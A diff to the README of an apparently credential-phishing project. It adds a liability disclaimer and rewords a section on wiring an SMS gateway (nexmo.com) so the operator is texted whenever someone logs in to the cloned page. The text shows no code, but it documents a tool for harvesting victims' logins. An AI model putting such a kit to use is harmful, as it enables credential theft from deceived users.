@@ -1,3 +1,11 @@
+DISCLAIMER
+==========
+
+All the information on this example is published in good faith and for educational information purpose only.
+Author does not make any warranties about the completeness, reliability and accuracy of this information.
+Any action you take upon the information you find on this example (Phishing), is strictly at your own risk.
+Author will not be liable for any losses and/or damages in connection with the use of this example.
+
 # Phishing
 
 ## Synopsys
@@ -23,8 +31,8 @@ npm i
 
 #### Sms-geteway integration
 
-If you want get SMS messages when nobody was logged in your copy page,
-then your application should be integrated on any "sms gateway" service.
+If you want to get SMS messages when anyone has logged in your copied page,
+then your application should be integrated with any "sms gateway" service.
 
 I show example on "nexmo.com"
 
